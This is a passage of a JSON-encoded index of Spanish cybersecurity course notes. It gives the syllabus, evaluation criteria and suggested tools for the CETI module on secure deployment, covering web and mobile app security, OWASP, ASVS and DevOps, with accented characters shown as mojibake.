ASVS, herramientas de gesti√≥n de proyectos (Jira).\nAdicional: Explorar c√≥mo integrar ASVS en el proceso de desarrollo; posibilidades de automatizaci√≥n.\n\nCriterio 2.d: Reconocer los principales riesgos de las aplicaciones\n\nConceptos: Riesgos comunes (OWASP Top Ten); identificaci√≥n seg√∫n tipo de aplicaci√≥n.\nPr√°cticas: Realizar modelado de amenazas; priorizar riesgos seg√∫n probabilidad e impacto.\nHerramientas: Microsoft Threat Modeling Tool, recursos de OWASP.\nAdicional: Discutir riesgos emergentes en tecnolog√≠as como IoT; mantenerse actualizado con CVE.\n"},"ceti/Puesta-en-produccion-segura/RA-3/Unidad-3---RA-3":{"title":"Unidad 3 - RA 3","links":[],"tags":[],"content":"Resultado de Aprendizaje 3: Detecci√≥n y correcci√≥n de vulnerabilidades de aplicaciones web\nCriterio 3.a: Validar las entradas de los usuarios\n\nConceptos: T√©cnicas de validaci√≥n de entrada (sint√°ctica, sem√°ntica); vulnerabilidades como XSS y SQLi.\nPr√°cticas: Implementar validaci√≥n en c√≥digo; probar debilidades con herramientas.\nHerramientas: WAFs, an√°lisis est√°tico, herramientas de pruebas de penetraci√≥n (Burp Suite).\nAdicional: Principio de no confiar en la entrada del usuario; validaci√≥n en m√∫ltiples capas.\n\nCriterio 3.b: Detectar riesgos de inyecci√≥n en servidor y cliente\n\nConceptos: Tipos de inyecci√≥n (SQL, OS, c√≥digo); prevenci√≥n mediante consultas parametrizadas.\nPr√°cticas: Identificar puntos de inyecci√≥n; implementar correcciones en c√≥digo.\nHerramientas: SQLMap, an√°lisis est√°tico, esc√°neres de vulnerabilidades (Acunetix).\nAdicional: Analizar ataques de inyecci√≥n famosos; uso de frameworks ORM para prevenci√≥n.\n\nCriterio 3.c: Gestionar correctamente la sesi√≥n del usuario\n\nConceptos: Vulnerabilidades de gesti√≥n de sesiones (fijaci√≥n, secuestro); mejores pr√°cticas como cookies seguras.\nPr√°cticas: Implementar gesti√≥n de sesiones segura; probar vulnerabilidades.\nHerramientas: Herramientas de desarrollo del navegador, Burp Suite, bibliotecas de sesiones seguras.\nAdicional: Comparar autenticaci√≥n basada en tokens (JWT) con sesiones tradicionales.\n\nCriterio 3.d: Usar roles para el control de acceso\n\nConceptos: Principios de control de acceso (menor privilegio); implementaci√≥n de RBAC.\nPr√°cticas: Dise√±ar e implementar RBAC; probar controles de acceso.\nHerramientas: Frameworks de autenticaci√≥n (Spring Security), herramientas de pruebas de penetraci√≥n.\nAdicional: Errores comunes como referencias directas a objetos; auditor√≠a de decisiones de acceso.\n\nCriterio 3.e: Usar algoritmos criptogr√°ficos seguros para contrase√±as\n\nConceptos: Hashing de contrase√±as; algoritmos recomendados (bcrypt, Argon2).\nPr√°cticas: Implementar hashing; verificar almacenamiento; intentar cracking √©ticamente.\nHerramientas: Bibliotecas de hashing (bcrypt), herramientas de cracking (Hashcat).\nAdicional: Pol√≠ticas de contrase√±as; autenticaci√≥n multifactor.\n\nCriterio 3.f: Configurar servidores web para reducir riesgos\n\nConceptos: Endurecimiento de servidores; cabeceras de seguridad (HSTS, CSP).\nPr√°cticas: Configurar servidores con mejores pr√°cticas; escanear configuraciones err√≥neas.\nHerramientas: Gu√≠as de configuraci√≥n (Mozilla Observatory), esc√°neres (Nikto).\nAdicional: Configuraci√≥n de HTTPS; an√°lisis de logs para detecci√≥n de ataques.\n\nCriterio 3.g: Incorporar medidas contra ataques automatizados\n\nConceptos: Ataques automatizados (brute force, spam); CAPTCHAs, limitaci√≥n de tasas.\nPr√°cticas: Implementar CAPTCHAs; configurar limitaci√≥n de tasas; simular ataques.\nHerramientas: reCAPTCHA, WAFs con detecci√≥n de bots, herramientas de monitorizaci√≥n.\nAdicional: Equilibrio entre seguridad y experiencia del usuario; detecci√≥n de bots basada en ML.\n"},"ceti/Puesta-en-produccion-segura/RA-4/Unidad-4---RA-4":{"title":"Unidad 4 - RA 4","links":[],"tags":[],"content":"Resultado de Aprendizaje 4: Detecci√≥n de problemas de seguridad en aplicaciones para dispositivos m√≥viles\nCriterio 4.a: Comparar modelos de permisos de plataformas m√≥viles\n\nConceptos: Sistemas de permisos en Android e iOS; implicaciones de seguridad.\nPr√°cticas: Desarrollar apps que soliciten permisos; analizar manifests.\nHerramientas: Android Studio, Xcode, MobSF.\nAdicional: Evoluci√≥n de modelos de permisos; gesti√≥n de permisos por usuarios.\n\nCriterio 4.b: Describir t√©cnicas de almacenamiento seguro de datos\n\nConceptos: M√©todos de almacenamiento (preferencias, bases de datos); encriptaci√≥n de datos.\nPr√°cticas: Implementar almacenamiento encriptado; inspeccionar datos de la app.\nHerramientas: Bibliotecas de encriptaci√≥n, herramientas forenses (uso educativo).\nAdicional: Diferencias entre almacenamiento en Android e iOS; manejo seguro de datos en memoria.\n\nCriterio 4.c: Implementar validaci√≥n de compras integradas con validaci√≥n en servidor\n\nConceptos: Mec√°nicas de compras in-app; riesgos de validaci√≥n del lado del cliente.\nPr√°cticas: Configurar compras; implementar validaci√≥n del servidor; probar spoofing.\nHerramientas: SDKs de plataforma (Google Play Billing, StoreKit), frameworks del lado del servidor.\nAdicional: T√©cnicas de fraude; manejo de reembolsos y suscripciones.\n\nCriterio 4.d: Usar herramientas de monitorizaci√≥n de tr√°fico de red\n\nConceptos: Protocolos seguros vs. inseguros; ataques MITM; pinning de certificados.\nPr√°cticas: Inspeccionar tr√°fico con herramientas; implementar pinning.\nHerramientas: Wireshark, Burp Suite, Charles Proxy.\nAdicional: Manejo de claves API; impacto de VPNs en seguridad.\n\nCriterio 4.e: Inspeccionar binarios para buscar fugas de informaci√≥n\n\nConceptos: Informaci√≥n en binarios (cadenas, claves); t√©cnicas de ofuscaci√≥n.\nPr√°cticas: Descompilar apps; buscar datos sensibles; aplicar ofuscaci√≥n.\nHerramientas: jadx, apktool, ProGuard.\nAdicional: Aspectos legales y √©ticos del reverse engineering; protecci√≥n de propiedad intelectual.\n"},"ceti/Puesta-en-produccion-segura/RA-5/Unidad-5---RA-5":{"title":"Unidad 5 - RA 5","links":[],"tags":[],"content":"Resultado de Aprendizaje 5: Implantaci√≥n de sistemas seguros de desplegado de software\nCriterio 5.a: Identificar caracter√≠sticas, principios y objetivos de DevOps\n\nConceptos: Beneficios de DevOps; principios de colaboraci√≥n y automatizaci√≥n.\nPr√°cticas: Participar en simulaciones de DevOps; analizar estudios de casos.\nHerramientas: Herramientas de colaboraci√≥n (Slack), gesti√≥n de proyectos (Jira).\nAdicional: Cambios culturales necesarios; integraci√≥n de DevSecOps.\n\nCriterio 5.b: Implementar sistemas de control de versiones\n\nConceptos: Flujos de trabajo de Git; control de acceso en sistemas de control de versiones.\nPr√°cticas: Configurar repositorios Git; implementar protecci√≥n de ramas; realizar revisiones de c√≥digo.\nHerramientas: GitHub, GitLab, Bitbucket.\nAdicional: Manejo seguro de secretos; uso de Git hooks para automatizaci√≥n.\n\nCriterio 5.c: Instalar, configurar y verificar sistemas de integraci√≥n continua\n\nConceptos: Beneficios de la integraci√≥n continua; configuraci√≥n de pipelines.\nPr√°cticas: Crear pipelines de CI; integrar comprobaciones de seguridad.\nHerramientas: Jenkins, GitHub Actions, Travis CI.\nAdicional: Manejo de entornos (desarrollo, staging, producci√≥n); automatizaci√≥n de escaneos de seguridad.\n\nCriterio 5.d: Planificar, implementar y automatizar planes de despliegue\n\nConceptos: Estrategias de despliegue (blue-green, canary); automatizaci√≥n con herramientas.\nPr√°cticas: Configurar pipelines de despliegue; implementar rollback; usar infraestructura como c√≥digo.\nHerramientas: Ansible, Terraform, Kubernetes.\nAdicional: Monitoreo de despliegues; t√©cnicas de despliegue sin tiempo de inactividad.\n\nCriterio 5.e: Evaluar la capacidad del sistema para reaccionar ante fallos\n\nConceptos: Resiliencia del sistema; auto-escalado; comprobaciones de salud.\nPr√°cticas: Configurar auto-escalado; simular fallos; observar respuestas.\nHerramientas: Herramientas de auto-escalado en la nube (AWS Auto Scaling), Prometheus, Chaos Monkey.\nAdicional: Ingenier√≠a del caos; dise√±o de sistemas con fallos en mente.\n\nCriterio 5.f: Documentar tareas y procedimientos para recuperaci√≥n ante desastres\n\nConceptos: Planificaci√≥n de recuperaci√≥n ante desastres; RTO/RPO; backups.\nPr√°cticas: Crear planes de recuperaci√≥n; documentar procedimientos; simular desastres.\nHerramientas: Herramientas de backup, plataformas de documentaci√≥n (Confluence).\nAdicional: Ejemplos reales de recuperaci√≥n ante desastres; servicios de recuperaci√≥n en la nube.\n\nCriterio 5.g: Crear bucles de retroalimentaci√≥n √°giles entre miembros del equipo\n\nConceptos: Importancia de la retroalimentaci√≥n en agile/DevOps; pr√°cticas de comunicaci√≥n.\nPr√°cticas: Participar en ceremonias agile (standups, retrospectivas); configurar dashboards de m√©tricas.\nHerramientas: Slack, Jira, Grafana.\nAdicional: Fomentar una cultura de mejora continua; importancia de la seguridad psicol√≥gica en equipos.\n"},"ceti/Puesta-en-produccion-segura/Temario":{"title":"Temario","links":["ceti/Puesta-en-produccion-segura/RA-1/Unidad-1---RA-1","ceti/Puesta-en-produccion-segura/RA-2/Unidad-2---RA-2","ceti/Puesta-en-produccion-segura/RA-3/Unidad-3---RA-3","ceti/Puesta-en-produccion-segura/RA-4/Unidad-4---RA-4","ceti/Puesta-en-produccion-segura/RA-5/Unidad-5---RA-5"],"tags":["Apuntes","Temas","Puesta","Producci√≥n","Segura"],"content":"Desglose del temario PPS: RA - Criterios - Contenidos\nIntroducci√≥n a python: tryhackme.com/r/room/pythonbasics\n1. Prueba aplicaciones¬†web¬†y aplicaciones para dispositivos m√≥viles analizando la estructura del c√≥digo y su modelo de ejecuci√≥n.\nCriterios de evaluaci√≥n:\na) Se han comparado diferentes lenguajes de programaci√≥n de acuerdo a sus caracter√≠sticas principales.\n\nContenido asociado: Lenguajes de programaci√≥n interpretados y compilados\nEnlace: CE 1a\n\nb) Se han descrito los diferentes modelos de ejecuci√≥n de software.\n\nContenido asociado: Ejecuci√≥n de software\nEnlace: CE 1b\n\nc) Se han reconocido los elementos b√°sicos del c√≥digo fuente, d√°ndoles significado.\n\nContenido asociado: Fundamentos de la programaci√≥n\nContenido asociado: C√≥digo fuente y entornos de desarrollo\nContenido asociado: Elementos principales de los programas\nEnlace: CE 1c\n\nd) Se han ejecutado diferentes tipos de prueba de software.\n\nContenido asociado: Pruebas. Tipos\nEnlace: CE 1d\n\ne) Se han evaluado los lenguajes de programaci√≥n de acuerdo a la infraestructura de seguridad que proporcionan.\n\nContenido asociado: Seguridad en los lenguajes de programaci√≥n y sus entornos de ejecuci√≥n (‚Äúsandboxes‚Äù)\nEnlace: CE 1e\n\n2. Determina el nivel de seguridad requerido por aplicaciones identificando los vectores de ataque habituales y sus riesgos asociados.\nCriterios de evaluaci√≥n:\na) Se han caracterizado los niveles de verificaci√≥n de seguridad en aplicaciones establecidos por los est√°ndares internacionales (ASVS, ‚ÄúApplication Security Verification Standard‚Äù).\n\nContenido asociado: Fuentes abiertas para el desarrollo seguro\nContenido asociado: Comprobaciones de seguridad a nivel de aplicaci√≥n: ASVS\nEnlace: CE 2a\n\nb) Se ha identificado el nivel de verificaci√≥n de seguridad requerido por las aplicaciones en funci√≥n de sus riesgos de acuerdo a est√°ndares reconocidos.\n\nEnlace: CE 2b\n\nc) Se han enumerado los requisitos de verificaci√≥n necesarios asociados al nivel de seguridad establecido.\n\nContenido asociado: Requisitos de verificaci√≥n necesarios asociados al nivel de seguridad establecido\nEnlace: CE 2c\n\nd) Se han reconocido los principales riesgos de las aplicaciones desarrolladas, en funci√≥n de sus caracter√≠sticas.\n\nContenido asociado: Listas de riesgos de seguridad habituales: OWASP Top Ten (web y m√≥vil)\nEnlace: CE 2d\n\n3. Detecta y corrige vulnerabilidades de aplicaciones¬†web¬†analizando su c√≥digo fuente y configurando servidores¬†web.\nCriterios de evaluaci√≥n:\na) Se han validado las entradas de los usuarios.\n\nContenido asociado: Desarrollo seguro de aplicaciones web\nContenido asociado: Entrada basada en formularios. Inyecci√≥n. Validaci√≥n de la entrada\nEnlace: CE 3a\n\nb) Se han detectado riesgos de inyecci√≥n tanto en el servidor como en el cliente.\n\nContenido asociado: Listas p√∫blicas de vulnerabilidades de aplicaciones web. OWASP Top Ten\nEnlace: CE 3b\n\nc) Se ha gestionado correctamente la sesi√≥n del usuario durante el uso de la aplicaci√≥n.\n\nContenido asociado: Est√°ndares de autenticaci√≥n y autorizaci√≥n\nContenido asociado: Robo de sesi√≥n\nEnlace: CE 3c\n\nd) Se ha hecho uso de roles para el control de acceso.\n\nEnlace: CE 3d\n\ne) Se han utilizado algoritmos criptogr√°ficos seguros para almacenar las contrase√±as de usuario.\n\nContenido asociado: Almacenamiento seguro de contrase√±as\nEnlace: CE 3e\n\nf) Se han configurado servidores¬†web¬†para reducir el riesgo de sufrir ataques conocidos.\n\nContenido asociado: Vulnerabilidades web\nContenido asociado: Seguridad de portales y aplicativos web. Soluciones WAF\nEnlace: CE 3f\n\ng) Se han incorporado medidas para evitar los ataques a contrase√±as, env√≠o masivo de mensajes o registros de usuarios a trav√©s de programas autom√°ticos (bots).\n\nContenido asociado: Contramedidas. HSTS, CSP, CAPTCHAs, entre otros\nEnlace: CE 3g\n\n4. Detecta problemas de seguridad en las aplicaciones para dispositivos m√≥viles, monitorizando su ejecuci√≥n y analizando ficheros y datos.\nCriterios de evaluaci√≥n:\na) Se han comparado los diferentes modelos de permisos de las plataformas m√≥viles.\n\nContenido asociado: Modelos de permisos en plataformas m√≥viles. Llamadas al sistema protegidas\nEnlace: CE 4a\n\nb) Se han descrito t√©cnicas de almacenamiento seguro de datos en los dispositivos, para evitar la fuga de informaci√≥n.\n\nContenido asociado: Almacenamiento seguro de datos\nEnlace: CE 4b\n\nc) Se ha implantado un sistema de validaci√≥n de compras integradas en la aplicaci√≥n haciendo uso de validaci√≥n en el servidor.\n\nContenido asociado: Validaci√≥n de compras integradas en la aplicaci√≥n\nEnlace: CE 4c\n\nd) Se han utilizado herramientas de monitorizaci√≥n de tr√°fico de red para detectar el uso de protocolos inseguros de comunicaci√≥n de las aplicaciones m√≥viles.\n\nContenido asociado: Soluciones CASB\nEnlace: CE 4d\n\ne) Se han inspeccionado binarios de aplicaciones m√≥viles para buscar fugas de informaci√≥n sensible.\n\nContenido asociado: Firma y verificaci√≥n de aplicaciones\nContenido asociado: Fuga de informaci√≥n en los ejecutables\nEnlace: CE 4e\n\n5. Implanta sistemas seguros de desplegado de software, utilizando herramientas para la automatizaci√≥n de la construcci√≥n de sus elementos.\nCriterios de evaluaci√≥n:\na) Se han identificado las caracter√≠sticas, principios y objetivos de la integraci√≥n del desarrollo y operaci√≥n del software.\n\nContenido asociado: Puesta segura en producci√≥n\nContenido asociado: Pr√°cticas unificadas para el desarrollo y operaci√≥n del software (DevOps)\nEnlace: CE 5a\n\nb) Se han implantado sistemas de control de versiones, administrando los roles y permisos solicitados.\n\nContenido asociado: Sistemas de control de versiones\nEnlace: CE 5b\n\nc) Se han instalado, configurado y verificado sistemas de integraci√≥n continua, conect√°ndolos con sistemas de control de versiones.\n\nContenido asociado: Sistemas de automatizaci√≥n de construcci√≥n (build)\nContenido asociado: Integraci√≥n continua y automatizaci√≥n de pruebas\nEnlace: CE 5c\n\nd) Se han planificado, implementado y automatizado planes de desplegado de software.\n\nContenido asociado: Escalado de servidores. Virtualizaci√≥n. Contenedores\nContenido asociado: Gesti√≥n automatizada de configuraci√≥n de sistemas\nContenido asociado: Orquestaci√≥n de contenedores\nEnlace: CE 5d\n\ne) Se ha evaluado la capacidad del sistema desplegado para reaccionar de forma autom√°tica a fallos.\n\nContenido asociado: Herramientas de simulaci√≥n de fallos\nEnlace: CE 5e\n\nf) Se han documentado las tareas realizadas y los procedimientos a seguir para la recuperaci√≥n ante desastres.\n\nEnlace: CE 5f\n\ng) Se han creado bucles de retroalimentaci√≥n √°giles entre los miembros del equipo.\n\nEnlace: CE 5g\n"},"ceti/Puesta-en-produccion-segura/index":{"title":"Puesta en producci√≥n segura","links":["ceti/Puesta-en-produccion-segura/Temario"],"tags":[],"content":"Puesta en Producci√≥n Segura es un m√≥dulo del curso de especializaci√≥n en ciberseguridad en entornos de las tecnolog√≠as de la informaci√≥n (CETI). En esta documentaci√≥n pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n\nTabla Resumen de Herramientas por Resultado de Aprendizaje\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResultado de AprendizajeHerramientas Clave1. Prueba de aplicacionesPyCharm, Eclipse, Pylint, FindBugs, pytest, JUnit, Burp Suite, AFL, SonarQube, Bandit, OWASP Dependency-Check2. Nivel de seguridadASVS Checklists, OWASP Risk Rating, Microsoft Threat Modeling Tool, Jira3. Vulnerabilidades webBurp Suite, SQLMap, Acunetix, Spring Security, bcrypt, Hashcat, Nikto, reCAPTCHA, Mozilla Observatory4. Seguridad m√≥vilAndroid Studio, Xcode, MobSF, Wireshark, Charles Proxy, jadx, apktool, ProGuard, Google Play Billing, StoreKit5. Despliegue seguroGitHub, GitLab, Jenkins, GitHub Actions, Ansible, Terraform, Kubernetes, AWS Auto Scaling, Prometheus, Chaos Monkey, Confluence, Slack, Grafana\nEnlaces relevantes:\n\nOWASP Official Website\nOWASP ASVS Project\nPyCharm IDE\nEclipse IDE\nPylint Static Analysis\nFindBugs for Java\npytest Testing Framework\nJUnit Testing Framework\nBurp Suite Security Testing\nAmerican Fuzzing Lop (AFL)\nSonarQube Code Quality\nBandit Python Security Scanner\nOWASP Dependency-Check\nApache Web Server\nNginx Web Server\nDocker Containerization\nVisual Studio Code Editor\nOWASP Risk Rating Methodology\nMicrosoft Threat Modeling Tool\nJira Project Management\nOWASP Top Ten Project\nSQLMap Injection Testing\nAcunetix Web Vulnerability Scanner\nSpring Security Framework\nbcrypt Password Hashing\nHashcat Password Cracker\nNikto Security Scanner\nGoogle reCAPTCHA\nMozilla Observatory\nAndroid Studio IDE\nXcode IDE\nMobile Security Framework (MobSF)\nWireshark Network Analyzer\nCharles Proxy\njadx Decompiler\napktool Reverse Engineering\nProGuard Obfuscation\nGoogle Play Billing Library\nApple StoreKit Framework\nSlack Collaboration Platform\nGitHub Version Control\nGitLab Version Control\nBitbucket Version Control\nJenkins CI/CD\nGitHub Actions CI/CD\nTravis CI\nAnsible Automation\nTerraform Infrastructure as Code\nKubernetes Container Orchestration\nAWS Auto Scaling\nPrometheus Monitoring\nChaos Monkey Resilience Testing\nConfluence Documentation\nGrafana Dashboards\n"},"ceti/index":{"title":"CETI","links":["ceti/Hacking-√©tico/","ceti/Incidentes-de-ciberseguridad/","ceti/Normativa-de-ciberseguridad/","ceti/Puesta-en-produccion-segura/"],"tags":["CETI","Apuntes"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. A√∫n en una fase alfa.\n\n\nMateriales preparados para el Curso de Especializaci√≥n en Ciberseguridad en Entornos de las Tecnolog√≠as de la Informaci√≥n (CETI)\nInformaci√≥n general:\n\nwww.todofp.es/que-estudiar/familias-profesionales/informatica-comunicaciones/ce-ciberseguridad-entornos-tecnologias-informacion.html\n\nTemario de cada m√≥dulo profesional:\n\nHacking √âtico: HE\nIncidentes de Ciberseguridad: IC\nNormativa de Ciberseguridad: NC\nPuesta en Producci√≥n Segura: PPS\nBastionado de redes y sistemas (a√∫n en borrador)\nAn√°lisis forense inform√°tico (a√∫n en borrador)\n"},"index":{"title":"Apuntes y temario de SMR, DAW, CETI y otros","links":["ceti/","DAW/","SMR/","FP-Dual/"],"tags":["CETI","DAW","SMR","Apuntes","Temas","Ex√°menes","Pr√°cticas"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. A√∫n en una fase alfa.\n\n\nApuntes y temario de SMR, DAW, CETI y otros\nApuntes CETI\n\nApuntes y temario de Ciberseguridad en Entornos de las Tecnolog√≠as de la Informaci√≥n: CETI\n\nApuntes DAW\n\nApuntes y temario de Desarrollo de Aplicaciones Web: DAW\n\nApuntes SMR\n\nApuntes y temario de Sistemas Microinform√°ticos y Redes: SMR\n\nApuntes FP Dual\n\nApuntes y temario de Normativa sobre FP Dual (Andaluc√≠a): FP dual\n"}}